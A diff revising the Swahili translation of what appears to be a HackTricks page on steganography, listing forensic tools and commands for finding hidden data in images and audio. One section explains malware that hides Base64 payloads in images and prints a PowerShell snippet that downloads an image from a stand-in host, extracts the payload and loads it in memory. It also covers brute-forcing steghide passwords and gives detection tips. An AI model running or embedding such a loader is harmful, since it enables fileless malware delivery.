@@ -2,11 +2,11 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## **Kutoa Data kutoka kwa Faili**
+## **Kutoa Data kutoka kwa Mafaili**
 
 ### **Binwalk**
 
-Chombo cha kutafuta faili za binary kwa ajili ya faili na data zilizofichwa zilizomo ndani. Imewekwa kupitia `apt` na chanzo chake kinapatikana kwenye [GitHub](https://github.com/ReFirmLabs/binwalk).
+Chombo cha kutafuta mafaili ya binary kwa ajili ya mafaili yaliyofichwa na data zilizowekwa ndani. Inasakinishwa kupitia `apt` na chanzo chake kinapatikana kwenye [GitHub](https://github.com/ReFirmLabs/binwalk).
 ```bash
 binwalk file # Displays the embedded data
 binwalk -e file # Extracts the data
@@ -14,29 +14,29 @@ binwalk --dd ".*" file # Extracts all data
 ```
 ### **Foremost**
 
-Inarejesha faili kwa kuzingatia headers na footers zao; inafaa kwa picha za png. Imewekwa kupitia `apt` na chanzo chake kipo kwenye [GitHub](https://github.com/korczis/foremost).
+Inarejesha faili kwa msingi wa vichwa na viambatisho vya mwisho, muhimu kwa picha za png. Imewekwa kupitia `apt` na chanzo chake kiko kwenye [GitHub](https://github.com/korczis/foremost).
 ```bash
 foremost -i file # Extracts data
 ```
 ### **Exiftool**
 
-Husaidia kuona metadata ya faili, inapatikana [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
+Husaidia kuangalia metadata ya faili, inapatikana [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
 ```bash
 exiftool file # Shows the metadata
 ```
 ### **Exiv2**
 
-Inafanana na exiftool, kwa kuangalia metadata. Inayoweza kusakinishwa kupitia `apt`, chanzo kwenye [GitHub](https://github.com/Exiv2/exiv2), na ina [tovuti rasmi](http://www.exiv2.org/).
+Sawa na exiftool, kwa kuangalia metadata. Inaweza kusakinishwa kupitia `apt`, chanzo kwenye [GitHub](https://github.com/Exiv2/exiv2), na ina [tovuti rasmi](http://www.exiv2.org/).
 ```bash
 exiv2 file # Shows the metadata
 ```
-### **Faili**
+### **File**
 
-Tambua aina ya faili unayoshughulikia.
+Tambua aina ya file unayoshughulikia.
 
 ### **Strings**
 
-Inatoa strings zinazosomeka kutoka kwa mafaili, ikitumia mipangilio mbalimbali ya encoding kuchuja matokeo.
+Hutoa strings zinazoweza kusomwa kutoka kwenye files, ukitumia mipangilio mbalimbali ya encoding kuchuja matokeo.
 ```bash
 strings -n 6 file # Extracts strings with a minimum length of 6
 strings -n 6 file | head -n 20 # First 20 strings
@@ -48,65 +48,65 @@ strings -e b -n 6 file # 16bit strings (big-endian)
 strings -e L -n 6 file # 32bit strings (little-endian)
 strings -e B -n 6 file # 32bit strings (big-endian)
 ```
-### **Comparison (cmp)**
+### **Ulinganisho (cmp)**
 
-Inafaa kwa kulinganisha faili iliyobadilishwa na toleo lake la awali lililopatikana mtandaoni.
+Inafaa kwa kulinganisha faili iliyobadilishwa na toleo lake la asili lililopatikana mtandaoni.
 ```bash
 cmp original.jpg stego.jpg -b -l
 ```
-## **Kuchota Data Iliyofichwa katika Maandishi**
+## **Kutoa Data Zilizofichwa katika Maandishi**
 
-### **Data Iliyofichwa katika Nafasi**
+### **Data Zilizofichwa katika Nafasi**
 
-Vibonye visivyoonekana katika nafasi zinazofikiriwa kuwa tupu vinaweza kuficha taarifa. Ili kuchota data hii, tembelea [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).
+Tabia zisizoonekana katika nafasi zinazoonekana tupu zinaweza kuficha taarifa. Ili kuchota data hii, tembelea [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).
 
-## **Kuchota Data kutoka kwa Picha**
+## **Kutoa Data kutoka kwa Picha**
 
-### **Kutambua Maelezo ya Picha kwa kutumia GraphicMagick**
+### **Kutambua Maelezo ya Picha kwa GraphicMagick**
 
-[GraphicMagick](https://imagemagick.org/script/download.php) husaidia kubaini aina za faili za picha na kutambua uharibifu unaoweza kuwepo. Tekeleza amri ifuatayo ili kuchunguza picha:
+[GraphicMagick](https://imagemagick.org/script/download.php) hutumika kubaini aina za faili za picha na kugundua uharibifu unaowezekana. Endesha amri hapa chini ili kuchunguza picha:
 ```bash
 ./magick identify -verbose stego.jpg
 ```
-Ili kujaribu kurekebisha picha iliyoharibika, kuongeza maoni ya metadata kunaweza kusaidia:
+Ili kujaribu kutengeneza picha iliyoharibika, kuongeza maoni ya metadata kunaweza kusaidia:
 ```bash
 ./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
 ```
 ### **Steghide kwa Kuficha Data**
 
-Steghide inaruhusu kuficha data ndani ya faili za `JPEG, BMP, WAV, and AU`, na inaweza kuingiza na kutoa data iliyosimbwa. Ufungaji ni rahisi kwa kutumia `apt`, na [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).
+Steghide inaruhusu kuficha data ndani ya faili za `JPEG, BMP, WAV, and AU`, na inaweza kuingiza na kutoa data iliyosimbwa. Ufungaji ni rahisi kwa kutumia `apt`, and its [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).
 
 **Amri:**
 
 - `steghide info file` inaonyesha kama faili ina data iliyofichwa.
-- `steghide extract -sf file [--passphrase password]` hutoa data iliyofichwa; nenosiri ni hiari.
+- `steghide extract -sf file [--passphrase password]` hutoa data iliyofichwa; nenosiri hiari.
 
-Kwa uondoaji mtandaoni, tembelea [this website](https://futureboy.us/stegano/decinput.html).
+Kwa uondoaji wa mtandaoni, tembelea [this website](https://futureboy.us/stegano/decinput.html).
 
 **Bruteforce Attack with Stegcracker:**
 
-- Ili kujaribu password cracking kwenye Steghide, tumia [stegcracker](https://github.com/Paradoxis/StegCracker.git) kama ifuatavyo:
+- Ili kujaribu password cracking kwa Steghide, tumia [stegcracker](https://github.com/Paradoxis/StegCracker.git) kama ifuatavyo:
 ```bash
 stegcracker <file> [<wordlist>]
 ```
 ### **zsteg kwa Faili za PNG na BMP**
 
-zsteg inalenga kugundua data iliyofichwa katika faili za PNG na BMP. Usanidi unafanywa kupitia `gem install zsteg`, na chanzo chake kiko kwenye [GitHub](https://github.com/zed-0xff/zsteg).
+zsteg imejikita katika kugundua data iliyofichwa katika faili za PNG na BMP. Ufungaji unafanywa kwa `gem install zsteg`, chanzo chake kipo kwenye [GitHub](https://github.com/zed-0xff/zsteg).
 
 **Amri:**
 
-- `zsteg -a file` inatumia mbinu zote za ugunduzi kwenye faili.
-- `zsteg -E file` inaainisha payload kwa uondoaji wa data.
+- `zsteg -a file` inaendesha mbinu zote za ugunduzi kwenye faili.
+- `zsteg -E file` inabainisha payload kwa ajili ya uchimbaji wa data.
 
 ### **StegoVeritas na Stegsolve**
 
-**stegoVeritas** hukagua metadata, hutekeleza mabadiliko ya picha, na hutumia LSB brute forcing miongoni mwa vipengele vingine. Tumia `stegoveritas.py -h` kwa orodha kamili ya chaguzi na `stegoveritas.py stego.jpg` kutekeleza ukaguzi wote.
+**stegoVeritas** hukagua metadata, hufanya mabadiliko ya picha, na hutumia LSB brute forcing miongoni mwa vipengele vingine. Tumia `stegoveritas.py -h` kupata orodha kamili ya chaguzi na `stegoveritas.py stego.jpg` kutekeleza ukaguzi wote.
 
-**Stegsolve** hutumia vichujio mbalimbali vya rangi kufichua maandishi au ujumbe vilivyofichwa ndani ya picha. Inapatikana kwenye [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).
+**Stegsolve** inatumia vichujio vya rangi mbalimbali kufichua maandishi au ujumbe uliyojificha ndani ya picha. Inapatikana kwenye [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).
 
-### **FFT kwa Ugunduzi wa Yaliyofichwa**
+### **FFT kwa Ugunduo wa Maudhui Yaliyojificha**
 
-Fast Fourier Transform (FFT) techniques zinaweza kufichua yaliyofichwa katika picha. Rasilimali zenye msaada ni pamoja na:
+Mbinu za Fast Fourier Transform (FFT) zinaweza kufichua maudhui yaliyojificha katika picha. Rasilimali muhimu ni pamoja na:
 
 - [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
 - [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
@@ -114,7 +114,7 @@ Fast Fourier Transform (FFT) techniques zinaweza kufichua yaliyofichwa katika pi
 
 ### **Stegpy kwa Faili za Sauti na Picha**
 
-Stegpy inaruhusu kuingiza taarifa ndani ya faili za picha na sauti, ikiunga mkono fomati kama PNG, BMP, GIF, WebP, na WAV. Inapatikana kwenye [GitHub](https://github.com/dhsdshdhk/stegpy).
+Stegpy inaruhusu kuingiza taarifa ndani ya faili za picha na sauti, ikiunga mkono miundo kama PNG, BMP, GIF, WebP, na WAV. Inapatikana kwenye [GitHub](https://github.com/dhsdshdhk/stegpy).
 
 ### **Pngcheck kwa Uchambuzi wa Faili za PNG**
 
@@ -123,9 +123,9 @@ Kuchambua faili za PNG au kuthibitisha uhalali wao, tumia:
 apt-get install pngcheck
 pngcheck stego.png
 ```
-### **Zana Za Ziada za Uchambuzi wa Picha**
+### **Vifaa vya Ziada kwa Uchambuzi wa Picha**
 
-For further exploration, consider visiting:
+Kwa uchunguzi zaidi, zingatia kutembelea:
 
 - [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
 - [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
@@ -135,14 +135,14 @@ For further exploration, consider visiting:
 
 ## Marker-delimited Base64 payloads hidden in images (malware delivery)
 
-Commodity loaders kwa wingi huweka kwa siri Base64-encoded payloads kama plain text ndani ya picha ambazo vinginevyo ni halali (mara nyingi GIF/PNG). Badala ya pixel-level LSB, the payload imegawwa kwa unique start/end marker strings zilizowekwa ndani ya file text/metadata. Kisha, PowerShell stager hufanya:
+Commodity loaders kwa wingi zaidi zinaficha Base64-encoded payloads kama plain text ndani ya picha ambazo vinginevyo ni halali (mara nyingi GIF/PNG). Badala ya LSB ya ngazi ya pikseli, payload hutenganishwa na mfuatano maalum wa alama za kuanza/kuisha zilizowekwa ndani ya maandishi/metadata ya faili. Kisha PowerShell stager itafanya:
 
-- Inapakua the image kupitia HTTP(S)
-- Inatafuta the marker strings (mifano iliyoshuhudiwa: <<sudo_png>> … <<sudo_odt>>)
-- Inatoa the between-text na kisha hufanya Base64-decode kuwa bytes
-- Inapakia the .NET assembly in-memory na inaitisha known entry method (hakuna file inayowekwa kwenye disk)
+- Inapakua picha kupitia HTTP(S)
+- Inatafuta mfuatano wa alama (mifano iliyoshuhudiwa: <<sudo_png>> … <<sudo_odt>>)
+- Inatoa maandishi yaliyo kati na Base64-decodes hadi bytes
+- Inaleta .NET assembly in-memory na ku-invoke entry method inayojulikana (hakuna faili imeandikwa kwenye disk)
 
-Minimal PowerShell carving/loading snippet
+Snippet ndogo ya PowerShell ya carving/loading
 ```powershell
 $img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
 $start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
@@ -154,8 +154,8 @@ $bytes = [Convert]::FromBase64String($b64)
 }
 ```
 Vidokezo
-- Hii inapatikana chini ya ATT&CK T1027.003 (steganography). Mfululizo wa alama hutofautiana kati ya kampeni.
-- Uchunguzi: skana picha zilizopakuliwa kwa delimiters zinazojulikana; taja `PowerShell` inayotumia `DownloadString` ikifuatiwa na `FromBase64String`.
+- Hii inagawanywa chini ya ATT&CK T1027.003 (steganography). Marker strings hutofautiana kati ya kampeni.
+- Uchunguzi: skana picha zilizopakuliwa kutafuta delimiters zinazojulikana; tambulisha `PowerShell` inayotumia `DownloadString` ikifuatiwa na `FromBase64String`.
 
 See also phishing delivery examples and full in-memory invocation flow here:
 
@@ -163,27 +163,27 @@ See also phishing delivery examples and full in-memory invocation flow here:
 ../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
 {{#endref}}
 
-## **Kutoa Data kutoka kwa Mafaili ya Sauti**
+## **Kutoa Data kutoka kwenye Faili za Sauti**
 
-**Audio steganography** inatoa njia ya kipekee ya kuficha taarifa ndani ya mafaili ya sauti. Zana mbalimbali zinatumiwa kwa kuingiza au kupata maudhui yaliyofichwa.
+**Audio steganography** inatoa njia ya kipekee ya kuficha taarifa ndani ya mafaili ya sauti. Zana tofauti zinatumika kwa kuingiza au kupata tena maudhui yaliyofichwa.
 
 ### **Steghide (JPEG, BMP, WAV, AU)**
 
-Steghide ni zana yenye matumizi mengi iliyoundwa kwa kuficha data katika faili za JPEG, BMP, WAV, na AU. Maelekezo ya kina yapo katika the [stego tricks documentation](stego-tricks.md#steghide).
+Steghide ni zana yenye matumizi mengi iliyoundwa kuficha data katika mafaili ya JPEG, BMP, WAV, na AU. Maelekezo ya kina yamepewa katika [stego tricks documentation](stego-tricks.md#steghide).
 
 ### **Stegpy (PNG, BMP, GIF, WebP, WAV)**
 
-Zana hii inafaa kwa fomati mbalimbali ikiwemo PNG, BMP, GIF, WebP, na WAV. Kwa taarifa zaidi, rejea kwa [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).
+Zana hii inaendana na muundo mbalimbali ikiwemo PNG, BMP, GIF, WebP, na WAV. Kwa maelezo zaidi, rejea [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).
 
 ### **ffmpeg**
 
-ffmpeg ni muhimu kwa kutathmini uadilifu wa mafaili ya sauti, ikitoa taarifa za kina na kuonyesha tofauti yoyote.
+ffmpeg ni muhimu kwa kutathmini uadilifu wa mafaili ya sauti, kuonyesha taarifa za kina na kubaini utofauti wowote.
 ```bash
 ffmpeg -v info -i stego.mp3 -f null -
 ```
 ### **WavSteg (WAV)**
 
-WavSteg ni hodari kuficha na kutoa data ndani ya faili za WAV kwa kutumia mbinu ya least significant bit. Inapatikana kwenye [GitHub](https://github.com/ragibson/Steganography#WavSteg). Amri ni pamoja na:
+WavSteg ni mzuri katika kuficha na kutoa data ndani ya faili za WAV kwa kutumia least significant bit strategy. Inapatikana kwenye [GitHub](https://github.com/ragibson/Steganography#WavSteg). Amri ni pamoja na:
 ```bash
 python3 WavSteg.py -r -b 1 -s soundfile -o outputfile
 
@@ -191,21 +191,21 @@ python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
 ```
 ### **Deepsound**
 
-Deepsound inaruhusu usimbaji na utambuzi wa taarifa ndani ya faili za sauti kwa kutumia AES-256. Inaweza kupakuliwa kutoka [the official page](http://jpinsoft.net/deepsound/download.aspx).
+Deepsound inaruhusu encryption na detection ya taarifa ndani ya sound files kwa kutumia AES-256. Inaweza kupakuliwa kutoka [the official page](http://jpinsoft.net/deepsound/download.aspx).
 
 ### **Sonic Visualizer**
 
-Zana muhimu kwa ukaguzi wa kuona na uchambuzi wa faili za sauti, Sonic Visualizer inaweza kufichua vipengele vilivyofichika ambavyo havionekani kwa njia nyingine. Tembelea [official website](https://www.sonicvisualiser.org/) kwa habari zaidi.
+Chombo cha thamani kwa uchunguzi wa kuona na uchambuzi wa faili za sauti, Sonic Visualizer kinaweza kufichua vipengele vilivyofichika ambavyo haviwezi kubainika kwa njia nyingine. Tembelea [official website](https://www.sonicvisualiser.org/) kwa maelezo zaidi.
 
 ### **DTMF Tones - Dial Tones**
 
-Kugundua toni za DTMF katika faili za sauti kunaweza kufanywa kwa kutumia zana za mtandaoni kama [this DTMF detector](https://unframework.github.io/dtmf-detect/) na [DialABC](http://dialabc.com/sound/detect/index.html).
+Kugundua DTMF tones katika faili za sauti kunaweza kufanywa kwa kutumia zana za mtandaoni kama [this DTMF detector](https://unframework.github.io/dtmf-detect/) na [DialABC](http://dialabc.com/sound/detect/index.html).
 
 ## **Mbinu Nyingine**
 
 ### **Binary Length SQRT - QR Code**
 
-Data za binary ambazo mzizi wa mraba wa urefu wake ni nambari kamili zinaweza kuwakilisha QR code. Tumia kifungu hiki kuangalia:
+Data ya binary ambayo mzizi wa mraba (sqrt) wa urefu wake ni nambari kamili inaweza kuwakilisha QR code. Tumia kipande hiki cha msimbo kukagua:
 ```python
 import math
 math.sqrt(2500) #50
@@ -216,7 +216,7 @@ Kwa kubadilisha binary kuwa picha, angalia [dcode](https://www.dcode.fr/binary-i
 
 Kwa kutafsiri Braille, [Branah Braille Translator](https://www.branah.com/braille-translator) ni rasilimali bora.
 
-## **Marejeo**
+## **Marejeleo**
 
 - [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
 - [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
